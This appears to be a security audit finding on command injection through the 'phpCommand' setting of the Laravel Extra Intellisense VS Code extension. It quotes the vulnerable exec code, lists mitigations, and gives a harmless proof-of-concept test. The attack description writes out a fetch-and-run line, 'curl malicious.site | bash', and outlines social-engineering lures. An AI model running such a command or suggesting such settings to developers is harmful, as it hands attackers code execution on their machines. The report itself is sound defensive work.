#### 1. Arbitrary Command Execution via `phpCommand` Configuration

- **Description:**
    1. An attacker socially engineers a developer to modify the `LaravelExtraIntellisense.phpCommand` setting in their VS Code configuration.
    2. The attacker provides a malicious command to be executed instead of the legitimate PHP command. For example, instead of `php -r "{code}"`, the attacker could suggest `bash -c "curl malicious.site | bash"`.
    3. The developer, believing it is necessary for the extension to function correctly or being unaware of the security implications, applies the malicious configuration.
    4. When the extension triggers autocompletion, it uses the configured `phpCommand` to execute PHP code on the developer's machine.
    5. Due to the malicious configuration, instead of running PHP code, the attacker's arbitrary command is executed with the privileges of the developer's user.

- **Impact:**
    - **Critical:** Successful exploitation allows the attacker to execute arbitrary commands on the developer's machine. This could lead to:
        - **Data theft:** Access to sensitive files, environment variables, and credentials stored on the developer's machine.
        - **Malware installation:** Installation of backdoors, ransomware, or other malicious software.
        - **Account compromise:** If the developer has access to cloud accounts or internal systems, the attacker could potentially pivot and compromise these accounts.
        - **Supply chain attack:** Injected malware could potentially be included in projects and distributed to end-users.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - **Documentation Warning:** The `README.md` file includes a "Security Note" section that warns users about the risks of executing Laravel applications automatically and suggests disabling the extension if sensitive code is present in service providers.
    - **Location:** `README.md` file, in the "Security Note" section.

- **Missing Mitigations:**
    - **Input Validation and Sanitization:** The extension should validate and sanitize the `phpCommand` setting to prevent the execution of arbitrary commands. It should ensure that the command only executes `php` and necessary arguments, disallowing shell commands or other interpreters.
    - **Warning in Settings UI:** When configuring the `phpCommand` setting, the extension should display a clear warning about the security risks associated with modifying this setting and advise users to only use trusted commands.
    - **Restricting Command Execution:** Explore alternative methods for gathering project information that do not involve executing arbitrary PHP code or rely on user-provided commands. If executing PHP code is unavoidable, consider sandboxing or containerizing the execution environment to limit the impact of malicious commands.
    - **Principle of Least Privilege:** The extension should operate with the minimum privileges necessary. Avoid actions that require elevated permissions.

- **Preconditions:**
    - The developer must have the Laravel Extra Intellisense extension installed in VS Code.
    - The developer must be working on a Laravel project.
    - The attacker must successfully socially engineer the developer into setting a malicious `phpCommand` in the extension's configuration. This could be achieved through various methods, such as:
        - **Fake support requests:** Posing as support or community members offering help and suggesting "configuration changes" for better performance or bug fixes.
        - **Misleading tutorials or blog posts:** Creating online content that instructs users to use a malicious `phpCommand` as part of a "recommended setup".
        - **Compromised configuration sharing:** If developers share VS Code configurations, an attacker could inject a malicious `phpCommand` into a shared configuration.

- **Source Code Analysis:**
    - **File:** `src/helpers.ts`
    - **Function:** `runPhp(code: string, description: string|null = null)`
    - **Line:** `let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";`
    - **Line:** `let command = commandTemplate.replace("{code}", code);`
    - **Line:** `cp.exec(command, ...)`

    ```typescript
    static async runPhp(code: string, description: string|null = null) : Promise<string> {
        code = code.replace(/\"/g, "\\\"");
        if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
            code = code.replace(/\$/g, "\\$");
            code = code.replace(/\\\\'/g, '\\\\\\\\\'');
            code = code.replace(/\\\\"/g, '\\\\\\\\\"');
        }
        let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\""; // Vulnerable Line: Retrieves phpCommand from configuration
        let command = commandTemplate.replace("{code}", code); // Vulnerable Line: Constructs command by simple string replacement
        let out = new Promise<string>(function (resolve, error) {
            if (description != null) {
                Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
            }

            cp.exec(command, // Vulnerable Line: Executes command without validation or sanitization
                { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                function (err, stdout, stderr) { ... }
            );
        });
        return out;
    }
    ```
    - **Explanation:**
        - The `runPhp` function in `helpers.ts` is responsible for executing PHP code.
        - It retrieves the `phpCommand` from the extension's configuration using `vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand')`.
        - It then constructs the command string by simply replacing the `{code}` placeholder in the `commandTemplate` with the provided `$code`.
        - Finally, it uses `child_process.exec(command, ...)` to execute the constructed command on the system.
        - **Vulnerability:** The `phpCommand` setting is taken directly from user configuration without any validation or sanitization. If a user is tricked into setting a malicious command (e.g., `bash -c "malicious command"`), this command will be executed by `cp.exec` when the extension attempts to run PHP code. The code replacement mechanism is naive and doesn't prevent command injection.

- **Security Test Case:**
    1. **Pre-test setup:**
        - Install the Laravel Extra Intellisense extension in VS Code.
        - Open a Laravel project in VS Code.
        - Ensure the extension is activated.
    2. **Modify User Settings:**
        - Open VS Code settings (File -> Preferences -> Settings, or Code -> Settings -> Settings on macOS).
        - Switch to the "Workspace" settings tab.
        - Search for "Laravel Extra Intellisense" or navigate to "Extensions" -> "Laravel Extra Intellisense".
        - Locate the `LaravelExtraIntellisense: Php Command` setting.
        - Change the default value (e.g., `php -r "{code}"`) to a malicious command, such as:
            ```bash
            bash -c "echo 'VULNERABILITY_DEMOSTRATION' > /tmp/pwned.txt"
            ```
            or for Windows:
            ```bash
            cmd /c "echo VULNERABILITY_DEMOSTRATION > %TEMP%\\pwned.txt"
            ```
        - Save the settings.
    3. **Trigger Autocompletion:**
        - Open any PHP or Blade file in your Laravel project.
        - Trigger any autocompletion feature of the extension, for example, by typing `route('` or `config('` in a PHP file, or `@lang('` in a Blade file. This will force the extension to execute PHP code using the malicious `phpCommand`.
    4. **Verify Command Execution:**
        - After triggering autocompletion, check if the malicious command was executed.
        - For the example commands above, check if the file `/tmp/pwned.txt` (Linux/macOS) or `%TEMP%\\pwned.txt` (Windows) was created and contains the text "VULNERABILITY_DEMOSTRATION".
    5. **Expected Result:**
        - The file `/tmp/pwned.txt` or `%TEMP%\\pwned.txt` should be created with the expected content, demonstrating that the arbitrary command provided in the `phpCommand` setting was successfully executed.
    6. **Post-test cleanup:**
        - Revert the `LaravelExtraIntellisense: Php Command` setting back to its default value (e.g., `php -r "{code}"`).
        - Delete the created `pwned.txt` file from `/tmp` or `%TEMP%`.
